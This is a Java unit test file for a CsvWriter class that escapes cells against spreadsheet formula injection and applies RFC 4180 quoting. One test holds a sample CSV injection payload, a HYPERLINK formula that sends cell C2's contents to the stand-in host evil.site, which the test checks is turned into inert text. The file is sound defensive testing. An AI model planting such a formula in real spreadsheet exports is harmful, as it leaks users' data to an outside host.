package com.placementhub.common;

import static org.assertj.core.api.Assertions.assertThat;

import java.util.Arrays;
import java.util.List;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

class CsvWriterTest {

	// ---------- CSV injection ----------

	@ParameterizedTest
	@ValueSource(strings = { "=1+1", "+91 98765", "-2+3", "@SUM(A1:A2)", "\tTAB", "=HYPERLINK(\"x\")" })
	void cellsThatStartLikeAFormulaGetALeadingApostrophe(String value) {
		assertThat(CsvWriter.cell(value).replace("\"", "")).startsWith("'");
	}

	@Test
	void theHyperlinkAttackBecomesQuotedText() {
		String attack = "=HYPERLINK(\"http://evil.site/?d=\"&C2,\"Click\")";

		assertThat(CsvWriter.cell(attack))
				.isEqualTo("\"'=HYPERLINK(\"\"http://evil.site/?d=\"\"&C2,\"\"Click\"\")\"");
	}

	@Test
	void aCarriageReturnAtTheStartIsNeutralisedAndQuoted() {
		assertThat(CsvWriter.cell("\r=1+1")).isEqualTo("\"'\r=1+1\"");
	}

	@Test
	void formulaCharactersLaterInTheCellAreHarmless() {
		assertThat(CsvWriter.cell("Riya-Sharma")).isEqualTo("Riya-Sharma");
		assertThat(CsvWriter.cell("a@b.com")).isEqualTo("a@b.com");
		assertThat(CsvWriter.cell("8.50")).isEqualTo("8.50");
	}

	@Test
	void phoneNumbersWithAPlusAreEscapedLikeEveryOtherCell() {
		assertThat(CsvWriter.cell("+919876543210")).isEqualTo("'+919876543210");
		assertThat(CsvWriter.cell("9876543210")).isEqualTo("9876543210");
	}

	// ---------- RFC 4180 quoting ----------

	@Test
	void commasQuotesAndLineBreaksAreQuoted() {
		assertThat(CsvWriter.cell("Minimum CGPA is 7.00; yours is 6.50, sorry")).isEqualTo(
				"\"Minimum CGPA is 7.00; yours is 6.50, sorry\"");
		assertThat(CsvWriter.cell("say \"hi\"")).isEqualTo("\"say \"\"hi\"\"\"");
		assertThat(CsvWriter.cell("line1\nline2")).isEqualTo("\"line1\nline2\"");
	}

	@Test
	void nullAndEmptyAreEmptyCells() {
		assertThat(CsvWriter.cell(null)).isEmpty();
		assertThat(CsvWriter.cell("")).isEmpty();
	}

	@Test
	void aRowJoinsCellsWithCommasAndEndsWithCrlf() {
		assertThat(CsvWriter.row(Arrays.asList("a", null, "b,c", "=x"))).isEqualTo("a,,\"b,c\",'=x\r\n");
		assertThat(CsvWriter.row(List.of("only"))).isEqualTo("only\r\n");
	}

}
